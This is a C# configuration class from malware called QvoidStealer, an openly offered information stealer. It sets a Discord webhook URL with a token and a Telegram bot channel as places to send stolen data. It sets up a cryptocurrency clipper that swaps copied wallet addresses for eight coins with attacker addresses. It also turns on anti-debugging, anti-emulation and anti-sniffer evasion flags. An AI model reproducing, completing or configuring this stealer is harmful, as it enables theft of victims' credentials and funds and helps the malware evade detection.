﻿using QvoidWrapper;

namespace QvoidStealer.Main
{
    class Settings
    {
        public static DiscordWebhook Webhook = new DiscordWebhook("https://discordapp.com/api/webhooks/978601069628239883/jxxR-IRV-085dr2wyGIzJ6iQ9yEl0pwPJGVEIrK-pyGD5yOEALGYAUG-X96PwyH-nKEj");
        public static TelegramAPI Telegram = new TelegramAPI("%TELEGRAM_TOKEN_HERE%", 0/*%TELEGRAM_CHAT_ID_HERE%*/);
        public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");

        public static bool Silent = false;
        public static bool AntiWebSinffers = true;
        public static bool AntiDebug = true;
        public static bool AntiVM = false;
        public static bool AntiSandBoxie = false;
        public static bool AntiEmulation = true;
    }
}